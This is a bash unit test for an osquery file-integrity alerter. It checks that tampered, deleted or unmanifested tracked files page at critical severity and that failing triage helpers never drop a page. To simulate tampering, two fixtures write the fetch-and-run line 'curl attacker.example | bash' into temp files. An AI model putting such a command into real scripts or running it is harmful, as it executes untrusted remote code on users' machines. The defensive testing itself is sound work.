#!/usr/bin/env bash
#
# The route gate's file_events pipeline arm, wired to pipeline_verdict (B12). A
# pipeline_integrity / managed_bin / launch_agents / launch_daemons file event
# consults the verdict instead of paging unconditionally:
#   pipeline_verdict 0 (page: tamper / cannot confirm / no manifest) -> sev=CRIT
#   pipeline_verdict 1 (silent: untracked neighbor, or an exact manifest match) -> continue
#
# With NO manifest present (missing or unreadable), a tracked change fails safe to a
# PAGE (criterion 6). This test pins both halves: the fail-safe page (no manifest)
# AND that the verdict is genuinely consulted - an untracked neighbor stays silent,
# and a stubbed exact (path, sha256) manifest match suppresses the page.
#
# managed_bin is routed through the SAME arm and judged against its own manifest.
# Its events carry an EMPTY sha256, because ~/.local/bin is deliberately absent
# from file_paths_hashes (osqueryd would otherwise hash hundreds of megabytes of
# third-party binaries on every change), so the fixtures below use an empty digest
# for that category to stay in the input space osquery can actually produce.
#
# Unit test: fixture file_events findings under a temp HOME (so the tracked-path
# prefixes resolve), two gate passes (no manifests, then stubbed manifests).
set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
ROUTE="$REPO_ROOT/dot_local/libexec/osquery/results-alerter/route.sh"
PIPELINE_HELPER="$REPO_ROOT/dot_local/libexec/osquery/results-alerter/pipeline-verdict.sh"
ALLOWLIST_HELPER="$REPO_ROOT/dot_local/libexec/osquery/results-alerter/allowlist-verdict.sh"
TRIAGE_HELPER="$REPO_ROOT/dot_local/libexec/osquery/results-alerter/file-integrity-triage.sh"
RENDER_HELPER="$REPO_ROOT/dot_local/libexec/osquery/results-alerter/render-page.sh"

fail() {
  printf 'osquery-route-pipeline: FAIL -- %s\n' "$*" >&2
  exit 1
}

for h in "$ROUTE" "$PIPELINE_HELPER" "$ALLOWLIST_HELPER" "$TRIAGE_HELPER" "$RENDER_HELPER"; do
  [[ -f $h ]] || fail "missing helper: $h"
done

work="$(mktemp -d)"
trap 'rm -rf "$work"' EXIT
home="$work/home"
spy="$work/digest-spy.ndjson"
mkdir -p "$home/.local/libexec/osquery" "$home/.local/bin" "$home/Library/LaunchAgents"
absent_manifest="$work/no-manifest.sha256"
absent_bin_manifest="$work/no-bin-manifest.sha256"

# A file event: q=file_events_recent, cols.category the watch category, target_path
# the file, sha256 the event hash, action the FSEvents verb.
fe() { # <category> <target_path> <sha256> <verb>
  printf '{"q":"file_events_recent","act":"added","cols":{"category":"%s","target_path":"%s","sha256":"%s","action":"%s"},"ep":""}\n' \
    "$1" "$2" "$3" "$4"
}

# run_gate <manifest> <bin-manifest> <finding...> -> page NDJSON on stdout (digests
# go to the spy).
#
# TRIAGE_OVERRIDE swaps the triage helper for a hostile one, which is how the
# never-lose-a-page pin below is driven. UPGRADE_RECORD points the real helper at
# a fixture, so a test run never reads the operator's live record.
run_gate() {
  local manifest="$1" bin_manifest="$2"
  shift 2
  printf '%s\n' "$@" |
    HOME="$home" OSQUERY_PIPELINE_MANIFEST="$manifest" \
      OSQUERY_MANAGED_BIN_MANIFEST="$bin_manifest" OSQUERY_PIPELINE_REHASH_DELAY=0 \
      OSQUERY_LAUNCHD_ALLOWLIST="$work/no-allowlist.txt" DIGEST_SPY="$spy" \
      OSQUERY_UPGRADE_RECORD="${UPGRADE_RECORD:-$work/no-upgrade-record.tsv}" bash -c '
        # The REAL entry runs the gate under errexit, so the gate is exercised
        # under it here too. Without this line a helper that fails mid-pass would
        # abort the alerter in production and pass in this test.
        set -euo pipefail
        source "$1"
        source "$2"
        source "$3"
        source "$4"
        digest_append() { printf "%s\n" "$1" >>"$DIGEST_SPY"; }
        route_findings
      ' _ "$ROUTE" "$PIPELINE_HELPER" "$ALLOWLIST_HELPER" "${TRIAGE_OVERRIDE:-$TRIAGE_HELPER}"
}

# run_gate_render <manifest> <bin-manifest> <finding...> -> the {pcount, pbody}
# object the entry delivers. Same gate, with the RENDERER on the end, because the
# facts the gate attaches are not consumed until rendering: a finding the gate
# accepted and the renderer cannot print is a page that was confirmed and then
# lost, and only running both stages can tell the two apart.
run_gate_render() {
  local manifest="$1" bin_manifest="$2"
  shift 2
  printf '%s\n' "$@" |
    HOME="$home" OSQUERY_PIPELINE_MANIFEST="$manifest" \
      OSQUERY_MANAGED_BIN_MANIFEST="$bin_manifest" OSQUERY_PIPELINE_REHASH_DELAY=0 \
      OSQUERY_LAUNCHD_ALLOWLIST="$work/no-allowlist.txt" DIGEST_SPY="$spy" \
      OSQUERY_UPGRADE_RECORD="${UPGRADE_RECORD:-$work/no-upgrade-record.tsv}" bash -c '
        set -euo pipefail
        source "$1"
        source "$2"
        source "$3"
        source "$4"
        source "$5"
        digest_append() { printf "%s\n" "$1" >>"$DIGEST_SPY"; }
        route_findings | render_page
      ' _ "$ROUTE" "$PIPELINE_HELPER" "$ALLOWLIST_HELPER" "${TRIAGE_OVERRIDE:-$TRIAGE_HELPER}" "$RENDER_HELPER"
}

# assert_paged / refute_paged <pages> <tag> <message>. The negative form is a plain
# helper rather than `! grep` or `grep && fail`: under `set -e` an inverted or
# short-circuited status is not what ends the script, so those shapes only work by
# position accident and go dead the moment a line is added after them.
assert_paged() {
  grep -qF "$2" <<<"$1" || fail "$3"
}
refute_paged() {
  if grep -qF "$2" <<<"$1"; then fail "$3"; fi
}

# ---- Pass A: NO manifests. A tracked change (a libexec script, our own plist, a
#      ~/.local/bin path whose manifest is unreadable) fails safe to a page; an
#      untracked neighbor (a non-osquery plist, a /Library twin of one of our
#      plists) is silent, proving the verdict is consulted. The pipeline event
#      hashes are real 64-hex digests: osquery never emits a short hash, so a
#      fixture must stay in the producible input space. ----
event_hash="2222222222222222222222222222222222222222222222222222222222222222"
printf 'echo relay\n' >"$home/.local/bin/relayTAG02.sh"
page_a="$(run_gate "$absent_manifest" "$absent_bin_manifest" \
  "$(fe pipeline_integrity "$home/.local/libexec/osquery/results-alerterTAG01.sh" "$event_hash" UPDATED)" \
  "$(fe managed_bin "$home/.local/bin/relayTAG02.sh" "" UPDATED)" \
  "$(fe launch_agents "$home/Library/LaunchAgents/com.webdavis.osquery-uptimeTAG03.plist" "$event_hash" UPDATED)" \
  "$(fe launch_agents "$home/Library/LaunchAgents/com.apple.somethingTAG04.plist" "$event_hash" UPDATED)" \
  "$(fe launch_agents "/Library/LaunchAgents/com.webdavis.osquery-uptimeTAG07.plist" "$event_hash" UPDATED)")"

assert_paged "$page_a" TAG01 "a ~/.local/libexec/osquery script change must PAGE (fail-safe, no manifest)"
assert_paged "$page_a" TAG02 "a ~/.local/bin change with NO managed-bin manifest must PAGE (fail-safe: a broken known-good list gets louder, it does not un-watch the directory)"
assert_paged "$page_a" TAG03 "our own osquery LaunchAgent change must PAGE (fail-safe)"
refute_paged "$page_a" TAG04 "an untracked neighbor plist must be SILENT (the verdict is consulted, not page-always)"
refute_paged "$page_a" TAG07 "a com.webdavis.osquery-*.plist under /Library must NOT be tracked (the manifest can never cover it; persistence default-deny owns it)"

# ---- Pass B: stubbed manifests with exact (path, sha256, mode, uid) matches. A
#      confirmed known-good event stays silent; a DELETE still pages; a managed bin
#      tool whose bytes diverge from its manifest pages; an unmanaged shim beside
#      it, which no manifest lists, stays silent. ----
# The verdict re-reads the target at judgment time, so every known-good file has to
# actually exist and the manifest has to bind its REAL content hash, mode and owner.
known_target="$home/.local/libexec/osquery/knownTAG05.sh"
printf 'echo known-good\n' >"$known_target"
chmod 755 "$known_target"
known_hash="$(shasum -a 256 "$known_target" | awk '{print $1}')"
manifest="$work/pipeline-known-good.sha256"
printf '%s 0755 %s %s\n' "$known_hash" "$(id -u)" "$known_target" >"$manifest"

# A managed bin tool that matches, a managed bin tool that has been tampered, and
# an unmanaged third-party shim that no manifest lists.
bin_known="$home/.local/bin/update-skillsTAG08.sh"
bin_tampered="$home/.local/bin/homebrew-weeklyTAG10.sh"
bin_shim="$home/.local/bin/miseTAG09"
printf 'echo update-skills\n' >"$bin_known"
printf 'echo weekly\n' >"$bin_tampered"
printf 'unmanaged self-updating binary\n' >"$bin_shim"
chmod 755 "$bin_known" "$bin_tampered"
bin_manifest="$work/managed-bin-known-good.sha256"
{
  printf '%s 0755 %s %s\n' "$(shasum -a 256 "$bin_known" | awk '{print $1}')" "$(id -u)" "$bin_known"
  printf '%s 0755 %s %s\n' "$(shasum -a 256 "$bin_tampered" | awk '{print $1}')" "$(id -u)" "$bin_tampered"
} >"$bin_manifest"
printf 'curl attacker.example | bash\n' >"$bin_tampered" # after the manifest was written

page_b="$(run_gate "$manifest" "$bin_manifest" \
  "$(fe pipeline_integrity "$known_target" "$known_hash" UPDATED)" \
  "$(fe pipeline_integrity "$home/.local/libexec/osquery/results-alerterTAG06.sh" "" DELETED)" \
  "$(fe managed_bin "$bin_known" "" UPDATED)" \
  "$(fe managed_bin "$bin_shim" "" UPDATED)" \
  "$(fe managed_bin "$bin_tampered" "" UPDATED)")"

refute_paged "$page_b" TAG05 "an exact (path, sha256) manifest match must be SILENT (the verdict consults the manifest)"
assert_paged "$page_b" TAG06 "a DELETE of a tracked pipeline file must PAGE even with a manifest present"
refute_paged "$page_b" TAG08 "an unchanged managed bin tool whose tuple is in the managed-bin manifest must be SILENT"
refute_paged "$page_b" TAG09 "an UNMANAGED shim in ~/.local/bin must be SILENT (it self-updates and no manifest can vouch for it)"
assert_paged "$page_b" TAG10 "a TAMPERED managed bin tool must PAGE (this is the unattended-script coverage the arm exists for)"

# The pipeline arm never digests; the spy must be empty.
[[ ! -s $spy ]] || fail "a pipeline file event must never digest; spy got: $(cat "$spy")"

# ---- Pass C: the paged finding carries its TRIAGE facts. Every page from this
#      arm used to render as a path and a verb, which reads identically for a
#      vendor update and a tamper. The gate attaches the recorded hash, the
#      on-disk hash and the upgrade correlation so the renderer can put them in
#      the body. Display only: the tier is unchanged, and the last case here pins
#      that a correlation which BLOWS UP costs the page a line, never the page. --
tampered="$home/.local/libexec/osquery/tamperedTAG11.sh"
printf 'echo original\n' >"$tampered"
chmod 755 "$tampered"
original_hash="$(shasum -a 256 "$tampered" | awk '{print $1}')"
printf 'curl attacker.example | bash\n' >"$tampered" # after the manifest was written
triage_manifest="$work/triage-known-good.sha256"
printf '%s 0755 %s %s\n' "$original_hash" "$(id -u)" "$tampered" >"$triage_manifest"

UPGRADE_RECORD="$work/upgrade-record.tsv"
{
  printf '%s\t%s\n' "$(date +%s)" "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  printf 'tamperedTAG11.sh\tchanged\t1.0\t1.1\n'
} >"$UPGRADE_RECORD"

page_c="$(UPGRADE_RECORD="$UPGRADE_RECORD" run_gate "$triage_manifest" "$absent_bin_manifest" \
  "$(fe pipeline_integrity "$tampered" "$event_hash" UPDATED)")"

assert_paged "$page_c" TAG11 "a tampered pipeline file must PAGE"
[[ "$(jq -r '.triage.recorded' <<<"$page_c")" == "${original_hash:0:12}" ]] ||
  fail "the paged finding does not carry the manifest hash the page has to show -- $page_c"
[[ "$(jq -r '.triage.ondisk' <<<"$page_c")" != "${original_hash:0:12}" ]] ||
  fail "the paged finding reports the on-disk hash as the recorded one, so the page cannot show a divergence -- $page_c"
grep -qF 'recorded upgrade: tamperedTAG11.sh 1.0 -> 1.1' <<<"$(jq -r '.triage.upgrade' <<<"$page_c")" ||
  fail "the paged finding does not carry the upgrade correlation -- $page_c"

# A triage helper that fails and prints garbage: the page survives whole. This is
# the invariant the whole feature hangs on, because the correlation runs AFTER
# the verdict has already decided that something diverged from its known-good
# manifest, and a lost page there is a lost tamper alert.
broken_triage="$work/broken-triage.sh"
cat >"$broken_triage" <<'BROKEN'
# shellcheck shell=bash
file_integrity_triage() {
  printf 'not json at all {{{\n'
  return 3
}
BROKEN
page_d=""
broken_rc=0
page_d="$(TRIAGE_OVERRIDE="$broken_triage" run_gate "$triage_manifest" "$absent_bin_manifest" \
  "$(fe pipeline_integrity "$tampered" "$event_hash" UPDATED)")" || broken_rc=$?
[[ $broken_rc -eq 0 ]] ||
  fail "a triage helper that FAILS aborted the gate itself (exit $broken_rc), so the page was lost"
assert_paged "$page_d" TAG11 "a triage helper that FAILS must not take the page down with it"

# ---- Pass E: a triage object whose SYNTAX is right and whose member TYPES are
#      wrong. The gate used to check that the helper returned parseable JSON and
#      nothing else, so a half-deployed helper answering
#      {"recorded":"abc","ondisk":{},"upgrade":"lead"} was attached whole. The
#      renderer prints those members as strings, an object cannot be rendered as
#      one, and jq exits non-zero: the page the verdict had already confirmed was
#      never written, and because the entry checkpoints only after delivery, every
#      retry wedged on the same batch. The shape is checked where it is attached,
#      and a mismatch costs the page its two triage LINES and nothing else. ----
wrongtype_triage="$work/wrongtype-triage.sh"
cat >"$wrongtype_triage" <<'WRONGTYPE'
# shellcheck shell=bash
file_integrity_triage() {
  printf '{"recorded":"abc","ondisk":{},"upgrade":"lead"}\n'
  return 0
}
WRONGTYPE
render_rc=0
page_e="$(TRIAGE_OVERRIDE="$wrongtype_triage" run_gate_render "$triage_manifest" "$absent_bin_manifest" \
  "$(fe pipeline_integrity "$tampered" "$event_hash" UPDATED)")" || render_rc=$?
[[ $render_rc -eq 0 ]] ||
  fail "a triage object with wrong member types killed the render (exit $render_rc), so a confirmed page was lost"
[[ "$(jq -r '.pcount' <<<"$page_e")" == 1 ]] ||
  fail "a triage object with wrong member types cost the page itself -- $page_e"
page_e_body="$(jq -r '.pbody' <<<"$page_e")"
assert_paged "$page_e_body" "tamperedTAG11.sh" \
  "the page no longer names the file whose bytes left the manifest"
refute_paged "$page_e_body" "Recorded:" \
  "a triage object the renderer cannot print was still attached to the finding"
refute_paged "$page_e_body" "Upgrade record:" \
  "a triage object the renderer cannot print was still attached to the finding"

# The same renderer prints the triage lines when the helper answers the shape it
# promises, so the check above rejects a broken object rather than every object.
page_f="$(UPGRADE_RECORD="$UPGRADE_RECORD" run_gate_render "$triage_manifest" "$absent_bin_manifest" \
  "$(fe pipeline_integrity "$tampered" "$event_hash" UPDATED)")"
assert_paged "$(jq -r '.pbody' <<<"$page_f")" "Recorded:" \
  "a well-formed triage object was dropped, so the page lost the facts it exists to carry"

# ---- Pass F: the triage helper's DIAGNOSTICS reach the alerter log. Every way
#      the correlation can degrade is written to stderr on purpose (an unreadable
#      record, a record that is not a regular file, a record with a row it cannot
#      describe), and the alerter's stderr is its launchd log, which is the only
#      place those states are ever visible. The gate called the helper with
#      2>/dev/null, so the page said the record could not be read and the log
#      never said which path or why. Silencing it also cost nothing it protected:
#      the call is already guarded, so a noisy helper could never fail the page. --
noisy_triage="$work/noisy-triage.sh"
cat >"$noisy_triage" <<'NOISY'
# shellcheck shell=bash
file_integrity_triage() {
  printf 'osquery file-integrity triage: the upgrade record at /nowhere/record.tsv is not a readable regular file\n' >&2
  printf '{"recorded":"?","ondisk":"?","upgrade":"the upgrade record could not be read"}\n'
  return 0
}
NOISY
gate_stderr="$work/gate-stderr"
: >"$gate_stderr"
page_g="$(TRIAGE_OVERRIDE="$noisy_triage" run_gate "$triage_manifest" "$absent_bin_manifest" \
  "$(fe pipeline_integrity "$tampered" "$event_hash" UPDATED)" 2>"$gate_stderr")"
assert_paged "$page_g" TAG11 "a helper that warns must still page"
grep -qF '/nowhere/record.tsv' "$gate_stderr" ||
  fail "the triage helper's diagnostic never reached the alerter log: $(cat "$gate_stderr")"

# Every paged line is a CRIT finding.
for out in "$page_a" "$page_b" "$page_c" "$page_d"; do
  [[ -z $out ]] && continue
  [[ "$(jq -s 'all(.[]; .sev == "CRIT")' <<<"$out")" == true ]] ||
    fail "every paged pipeline finding must carry .sev == CRIT"
done

printf 'osquery-route-pipeline: OK (fail-safe PAGE for a libexec file, our own home-dir plist and a bin path with no manifest; a non-osquery plist, a /Library twin and an unmanaged bin shim SILENT; manifest exact match SILENT; a tampered managed bin tool and a delete PAGE; a paged finding carries its recorded/on-disk hashes and the upgrade correlation, and survives a triage helper that fails; none digest)\n'
